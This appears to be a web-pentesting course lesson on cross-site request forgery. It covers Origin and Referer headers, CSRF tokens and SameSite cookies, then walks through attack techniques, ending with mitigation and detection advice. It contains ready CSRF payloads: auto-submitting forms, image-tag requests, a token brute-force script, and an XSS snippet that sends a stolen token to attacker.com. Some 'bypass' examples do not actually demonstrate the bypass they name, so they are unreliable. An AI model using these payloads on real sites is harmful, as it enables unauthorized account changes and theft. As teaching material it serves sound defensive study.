# Cross-Site Request Forgery (CSRF)

## What you will learn in this course üßêüßê

- Understand the concept of Cross-Site Request Forgery (CSRF)
- Learn how CSRF attacks work and how to exploit them

In web applications, Cross-Site Request Forgery (CSRF) protection is essential for safeguarding sensitive operations that involve state-changing actions performed by authenticated users.

CSRF attacks exploit the trust a web application has in the user's browser, tricking the user into performing unintended actions. However, implementing CSRF protection is necessary and legitimate when dealing with operations such as submitting forms, updating user settings, or performing transactions.

For instance, an application that allows users to change their account settings or make financial transactions needs to ensure that these actions are genuinely initiated by the authenticated user and not by a malicious third party. CSRF tokens are used to create a unique identifier that verifies the legitimacy of the request, ensuring that the action is intentional and not a result of a forged request from another site.

## Description

CSRF (Cross-Site Request Forgery) tricks a user into performing actions they did not intend to on a web application in which they are authenticated. This can lead to unauthorized actions being executed on behalf of the user without their knowledge.

### Things to Know Before Starting

In the context of Cross-Site Request Forgery (CSRF), the `Origin` and `Referer` headers are HTTP headers used to help verify the legitimacy of incoming requests by indicating the origin of the request. Both headers can be employed as part of CSRF protection mechanisms, but they have distinct roles and limitations:

#### Origin Header

**Definition**: The `Origin` header is an HTTP header sent with requests to indicate the origin of the request. It provides information about the scheme (protocol), host, and port of the request's origin. This header is included in HTTP requests made with JavaScript, especially with methods like `fetch()` or `XMLHttpRequest` that involve cross-origin resource sharing (CORS).

**Role in CSRF Protection**: The `Origin` header is used to verify that requests are coming from a trusted source. By checking this header, a server can confirm that the request originates from the expected domain and not from a malicious site trying to perform CSRF attacks.

**Example**:
When a user makes a request from `https://example.com`, the `Origin` header might look like this:

```
Origin: https://example.com
```

On the server side, you can check this header to ensure the request is coming from a trusted origin:

```php
if ($_SERVER['HTTP_ORIGIN'] !== 'https://example.com') {
    die('Invalid Origin');
}
```

**Limitations**: The `Origin` header is not always present in all types of HTTP requests, particularly those that do not involve cross-origin requests or are made from certain browsers or configurations. It is also possible for attackers to craft requests that manipulate the `Origin` header if the server's validation is not robust.

#### Referer Header

**Definition**: The `Referer` header (note the common misspelling of "Referrer") is an HTTP header sent with requests to indicate the address (URL) of the web page that linked to the resource being requested. This header is included with most requests, including those made from forms and links.

**Role in CSRF Protection**: The `Referer` header is used to verify that requests are coming from an expected page or site. By checking this header, a server can confirm that the request originated from a page on the same domain or a trusted domain, which helps to ensure that requests are not coming from malicious sites.

**Example**:
When a user clicks a link or submits a form from `https://example.com/page`, the `Referer` header might look like this:

```
Referer: https://example.com/page
```

On the server side, you can check this header to ensure requests are coming from a legitimate source:

```php
if (strpos($_SERVER['HTTP_REFERER'], 'https://example.com') !== 0) {
    die('Invalid Referer');
}
```

**Limitations**: The `Referer` header can be easily manipulated or omitted. Some browsers or privacy tools may strip out this header or set it to an empty value. As a result, relying solely on `Referer` checks for CSRF protection can be insufficient and potentially insecure.

#### CSRF Tokens

**Definition**: CSRF tokens are unique, random values generated for each user session or request to prevent Cross-Site Request Forgery attacks. These tokens are included in forms or HTTP requests and validated server-side to ensure that the request is legitimate and originates from the authenticated user.

**Role in CSRF Protection**: By embedding a CSRF token in forms or state-changing requests, the server can verify that the request comes from a trusted source. The token acts as a secret key that only the legitimate user should possess, making it difficult for attackers to forge valid requests without access to the token.

**Example**:
When a user submits a form to change their password, the form includes a hidden field with a CSRF token:

```html
<form action="/update-password" method="POST">
    <input type="hidden" name="csrf_token" value="randomly_generated_token">
    <input type="password" name="new_password">
    <input type="submit" value="Update Password">
</form>
```

On the server side, the token is validated to ensure it matches the token stored in the user's session:

```php
session_start();
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('Invalid CSRF Token');
}
```

**Limitations**: CSRF tokens must be securely managed and cannot be relied upon alone for comprehensive security. They must be implemented correctly, and their confidentiality must be maintained. Additionally, if an attacker can steal the token via XSS or other means, they can still perform CSRF attacks.

#### SameSite Cookie Attribute

**Definition**: The `SameSite` attribute is used to control how cookies are sent with cross-site requests. It can be set to `Strict`, `Lax`, or `None`, affecting whether cookies are included in requests initiated by third-party sites.

**Role in CSRF Protection**: Setting the `SameSite` attribute to `Strict` or `Lax` helps prevent cookies from being sent with cross-site requests. This restriction reduces the risk of CSRF attacks by ensuring that cookies are only sent with requests originating from the same site or domain.

**Example**:
Setting the `SameSite` attribute for a cookie in HTTP response headers:

```http
Set-Cookie: session_id=abc123; SameSite=Strict
```

**Limitations**: While the `SameSite` attribute can help mitigate CSRF attacks, it is not a complete solution. Some older browsers may not support this attribute, and users can still be vulnerable to attacks if other security measures are not in place. It is best used in conjunction with other CSRF protection techniques.

## Exploitation

An attacker exploits CSRF by creating a malicious website or email that contains links or scripts designed to make unauthorized requests to a target web application where the user is authenticated. When the user interacts with the malicious content, their browser sends the forged request along with their authentication cookies or credentials to the vulnerable application. This results in the execution of unintended actions, such as changing account settings, initiating transactions, or other operations that the user did not intend to perform.

### How a CSRF Attack Works

![CSRF](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D04-Web_Pentesting_01/01-lectures/CSRF.png)

A Cross-Site Request Forgery (CSRF) attack exploits the trust a web application has in the user's browser, tricking the user into performing actions they did not intend to. Here‚Äôs a step-by-step explanation of how a CSRF attack typically unfolds:

#### 1. User Authentication

The victim logs into a web application, such as an online banking site or a social media platform. During this login process, the application sets an authentication cookie in the user's browser. This cookie is sent automatically with every request to the application, ensuring that the user remains authenticated.

#### 2. Attacker Prepares Malicious Content

The attacker crafts a malicious webpage or email that contains a request designed to perform an unwanted action on the target web application. This request often involves submitting a form or making an HTTP request that performs actions like changing account details, transferring funds, or any other sensitive operation.

#### 3. Victim Visits Malicious Content

The victim, while still authenticated on the target web application, visits the malicious webpage or clicks on a link in an email. This action causes the victim‚Äôs browser to make a request to the target application using the victim‚Äôs authentication cookies.

#### 4. Malicious Request Sent

The malicious content crafted by the attacker contains instructions to perform an action on the target web application. This request is sent to the web application with the victim‚Äôs authentication cookies automatically included by the browser. Since the application trusts these cookies, it processes the request as if it were made directly by the victim.

#### 5. Unintended Action Performed

The target web application processes the forged request as a legitimate action initiated by the victim. For example, if the malicious content is designed to change the victim‚Äôs account email address or transfer money, these actions are performed without the victim‚Äôs consent.

### Concrete Example of a CSRF Attack

1. **Target Web Application**: An online banking application where users can transfer money between accounts.

2. **Victim‚Äôs Session**: The victim is logged into their banking application, and the session is authenticated with a cookie.

3. **Malicious Content**: The attacker creates a malicious HTML page with the following code:

```html
<html>
<body>
	<form action="https://banking-website.com/transfer" method="POST">
		<input type="hidden" name="amount" value="1000">
		<input type="hidden" name="to_account" value="attacker_account">
		<input type="submit" value="Submit">
	</form>
	<script>
		document.forms[0].submit(); // Automatically submits the form
	</script>
</body>
</html>
```

4. **Victim‚Äôs Interaction**: The victim visits the malicious webpage while still logged into their online banking account.

5. **Request Sent**: The victim‚Äôs browser sends the form submission request to the banking website with the victim‚Äôs authentication cookie included.

6. **Action Executed**: The banking application processes the request and transfers $1000 from the victim‚Äôs account to the attacker‚Äôs account, as the request appears to come from the authenticated user.

## Different Techniques for CSRF

Cross-Site Request Forgery (CSRF) attacks exploit the trust that a web application has in the user‚Äôs browser, tricking users into performing actions they did not intend. Here are various CSRF techniques, including examples of vulnerable code and actual attack methods:

### Basic CSRF Techniques

#### Form Submission

**Description**: An attacker crafts a malicious HTML form that performs a sensitive action when submitted. If a user is authenticated and visits the malicious site, the form is automatically submitted on their behalf.

**Vulnerable Code Example**:

```html
<!-- Vulnerable page that allows changing email address -->
<form action="https://example.com/update-email" method="POST">
 <input type="hidden" name="email" value="new-email@example.com">
 <input type="submit" value="Submit">
</form>
```

**Malicious HTML**:

```html
<html>
 <body>
   <form action="https://example.com/update-email" method="POST" id="csrfForm">
	 <input type="hidden" name="email" value="attacker@example.com">
   </form>
   <script>
	 document.getElementById('csrfForm').submit();
   </script>
 </body>
</html>
```

**Attack Execution**: When the user visits the malicious page, their authenticated session with `example.com` will process the form submission, changing their email to the attacker's address.

#### Image and Script Tags

**Description**: Utilize HTML elements like `<img>` or `<script>` to trigger GET requests. These elements can make requests without user interaction.

**Vulnerable Code Example**:

```html
<!-- Image tag to trigger a GET request -->
<img src="https://example.com/change-password?password=newpassword">
```

**Malicious HTML**:

```html
<html>
 <body>
   <img src="https://example.com/change-password?password=attackerpassword" />
 </body>
</html>
```

**Attack Execution**: When the user visits the page with the `<img>` tag, the request to change the password is executed using the user's session.

### Token Bypass Techniques

#### Lack of Token

**Description**: Exploit applications that do not require or validate CSRF tokens, allowing unauthorized actions if no token is provided.

**Vulnerable Code Example**:

```php
// No CSRF token validation
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 updateProfile($_POST['username']);
}
```

**Malicious Request**:

```html
<html>
 <body>
   <form action="https://example.com/update-profile" method="POST">
	 <input type="hidden" name="username" value="hackeduser">
	 <input type="submit" value="Update">
   </form>
 </body>
</html>
```

**Attack Execution**: The user‚Äôs session will process the profile update without checking for a CSRF token.

#### Global Token Pool

**Description**: Use a CSRF token obtained from a global pool or another user's session to perform unauthorized actions.

**Vulnerable Code Example**:

```php
// Using a global CSRF token pool
$csrf_token = getGlobalToken(); // This should be session-specific
```

**Malicious Request**:

```html
<html>
 <body>
   <form action="https://example.com/update-email" method="POST">
	 <input type="hidden" name="email" value="hacked@example.com">
	 <input type="hidden" name="csrf_token" value="valid-global-token">
	 <input type="submit" value="Submit">
   </form>
 </body>
</html>
```

**Attack Execution**: An attacker uses a valid token from a global pool to perform unauthorized actions on behalf of the victim.

### Method and Header Manipulation

#### Method Override

**Description**: Use HTTP method override techniques to bypass restrictions on HTTP methods (e.g., changing a `POST` to a `PUT` request).

**Vulnerable Code Example**:

```php
// Processing HTTP methods directly
$method = $_SERVER['REQUEST_METHOD'];
if ($method === 'POST') {
 processForm();
}
```

**Malicious Request**:

```html
<html>
 <body>
   <form action="https://example.com/update-profile" method="POST">
	 <input type="hidden" name="_method" value="PUT">
	 <input type="hidden" name="username" value="attacker">
	 <input type="submit" value="Update">
   </form>
 </body>
</html>
```

**Attack Execution**: An attacker changes the method of a request to bypass restrictions, affecting how the server processes the request.

#### Custom Header Token Bypass

**Description**: Test CSRF protections by sending requests without the expected custom headers or with modified header values.

**Vulnerable Code Example**:

```php
// Expecting a custom CSRF token in a header
if ($_SERVER['HTTP_X_CSRF_TOKEN'] !== 'expected_token') {
 die('Invalid CSRF token');
}
```

**Malicious Request**:

```html
<html>
 <body>
   <form action="https://example.com/update-settings" method="POST">
	 <input type="hidden" name="setting" value="new_value">
	 <input type="submit" value="Submit">
   </form>
   <script>
	 fetch('https://example.com/update-settings', {
	   method: 'POST',
	   body: new URLSearchParams('setting=new_value')
	 });
   </script>
 </body>
</html>
```

**Attack Execution**: Bypass custom header checks by sending requests without the required headers.

### Content-Type and Preflight Bypass

#### Content-Type Manipulation

**Description**: Change the `Content-Type` of a request to bypass checks or restrictions that are based on content types.

**Vulnerable Code Example**:

```php
// Handling request based on Content-Type
if ($_SERVER['CONTENT_TYPE'] !== 'application/x-www-form-urlencoded') {
 die('Invalid Content-Type');
}
```

**Malicious Request**:

```html
<html>
 <body>
   <form action="https://example.com/update-settings" method="POST" enctype="text/plain">
	 <input type="hidden" name="setting" value="new_value">
	 <input type="submit" value="Submit">
   </form>
 </body>
</html>
```

**Attack Execution**: Change the `Content-Type` to bypass server checks that expect a different type.

#### Preflight Request Bypass

**Description**: Use alternative content types or methods to bypass preflight checks that are designed to prevent unauthorized requests.

**Vulnerable Code Example**:

```php
// Expecting a preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 header('Access-Control-Allow-Origin: *');
 exit;
}
```

**Malicious Request**:

```html
<html>
 <body>
   <script>
	 fetch('https://example.com/update-settings', {
	   method: 'POST',
	   headers: {
		 'Content-Type': 'application/json'
	   },
	   body: JSON.stringify({ setting: 'new_value' })
	 });
   </script>
 </body>
</html>
```

**Attack Execution**: Use content types or methods that bypass the server‚Äôs preflight checks to send unauthorized JSON data.

### Referrer and Origin Check Bypass

#### Referrer Header Manipulation

**Description**: Prevent the browser from sending the `Referer` header or manipulate it to bypass referrer checks.

**Vulnerable Code Example**:

```php
// Checking the Referer header for CSRF protection
if ($_SERVER['HTTP_REFERER'] !== 'https://example.com') {
 die('Invalid Referer');
}
```

**Malicious HTML**:

```html
<html>
 <body>
   <form action="https://example.com/update-profile" method="POST">
	 <input type="hidden" name="username" value="attacker">
	 <input type="submit" value="Update">
   </form>
   <meta name="referrer" content="no-referrer">
 </body>
</html>
```

**Attack Execution**: Bypass referrer checks by preventing the `Referer` header from being sent.

#### Origin Header Bypass

**Description**: Exploit weak implementations of origin checks by crafting URLs that appear to be from an allowed origin.

**Vulnerable Code Example**:

```php
// Checking the Origin header for CSRF protection
if ($_SERVER['HTTP_ORIGIN'] !== 'https://example.com') {
 die('Invalid Origin');
}
```

**Malicious HTML**:

```html
<html>
 <body>
   <form action="https://example.com/update-settings" method="POST">
	 <input type="hidden"

name="setting" value="new_value">
	 <input type="submit" value="Submit">
   </form>
 </body>
</html>
```

**Attack Execution**: Bypass origin checks by exploiting poor validation logic.

### Advanced CSRF Techniques

#### Exfiltrating CSRF Tokens

**Description**: Use XSS vulnerabilities to steal CSRF tokens from the application and perform unauthorized actions.

**Vulnerable Code Example**:

```html
<!-- Vulnerable page that exposes CSRF tokens -->
<input type="hidden" id="csrf_token" value="csrf_token_value">
```

**Malicious XSS Payload**:

```html
<script>
 var token = document.getElementById('csrf_token').value;
 fetch('https://attacker.com/steal_token', {
   method: 'POST',
   body: new URLSearchParams('token=' + token)
 });
</script>
```

**Attack Execution**: Use stolen tokens to perform unauthorized actions on the target application.

#### Socket.IO Exploitation

**Description**: Leverage real-time communication frameworks like Socket.IO to send unauthorized commands or data.

**Malicious JavaScript**:

```javascript
const socket = io('https://example.com');
socket.emit('updateSettings', { setting: 'malicious_value' });
```

**Attack Execution**: Send unauthorized commands through Socket.IO, exploiting real-time communication channels.

#### Brute Force and Automation

**Description**: Automate CSRF attacks or use brute force to guess and exploit CSRF tokens or credentials.

**Malicious Automation Script**:

```python
import requests

# Automated CSRF attack script
for token in range(1000000):
   response = requests.post(
	   'https://example.com/update-settings',
	   data={'setting': 'new_value', 'csrf_token': token}
   )
   if 'success' in response.text:
	   print(f'Token {token} was successful')
```

**Attack Execution**: Use automated tools to brute-force CSRF tokens or credentials, potentially bypassing token-based protections.

## Mitigation Techniques

To effectively mitigate CSRF vulnerabilities, implement a multi-faceted approach that addresses various aspects of security. Start by integrating anti-CSRF tokens into all forms and state-changing requests. These tokens should be unique to each user session and verified on the server side to ensure they correspond to the authenticated user. Utilizing cryptographically secure tokens and validating them for every state-changing request enhances security.

Additionally, set the `SameSite` attribute for cookies to `Strict` or `Lax`. This attribute restricts cookies from being sent with cross-site requests, thereby reducing the risk of CSRF attacks by ensuring cookies are not transmitted with requests initiated by third-party sites.

For sensitive actions such as changing account settings or performing financial transactions, require users to re-authenticate or provide additional verification. This step ensures that the action is genuinely initiated by the authenticated user, adding an extra layer of security.

Incorporate validation for `Origin` and `Referer` headers to confirm that requests originate from trusted sources. While these headers can be manipulated, using them as an additional layer of defense enhances overall protection.

Educating users about the risks associated with CSRF attacks is also crucial. Advise them to be cautious about clicking on suspicious links or interacting with unknown content, as increased user awareness can help mitigate the risk of successful CSRF attacks.

Leverage established security libraries and frameworks that offer built-in CSRF protection mechanisms. These tools often provide comprehensive solutions and are regularly updated to address new threats.

## Detection Techniques

To detect and address CSRF vulnerabilities effectively, conduct regular code reviews and security audits to ensure anti-CSRF mechanisms are properly implemented. Focus on areas involving state-changing actions and verify that CSRF tokens are used and validated as intended.

Perform targeted penetration testing to uncover potential CSRF attack vectors and assess the effectiveness of your implemented defenses. Monitoring server logs for unusual patterns, such as requests missing valid CSRF tokens or unexpected state changes, can help identify potential CSRF attempts.

Utilize automated security scanning tools to detect common CSRF vulnerabilities. These tools can highlight weaknesses in your application‚Äôs CSRF protection mechanisms, providing insights into areas that may require improvement.

Analyze HTTP requests for anomalies that may suggest forged requests, including discrepancies in headers or unexpected parameters. Implement request validation checks to detect and prevent unauthorized actions.

Deploy anomaly detection systems to monitor patterns of behavior and request types. These systems can flag suspicious activities, such as unusual request volumes or deviations from normal user behavior, further strengthening your defenses against CSRF attacks.

By combining these mitigation and detection strategies, organizations can bolster their defenses against CSRF attacks, protecting sensitive operations and reducing the risk of unauthorized actions on behalf of users.

## Resources

- [CSRF vs CORS](https://blog.vnaik.com/posts/web-attacks.html)
- [OWASP CSRF](https://owasp.org/www-community/attacks/csrf)
- [Mozilla Developer Network on CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF)
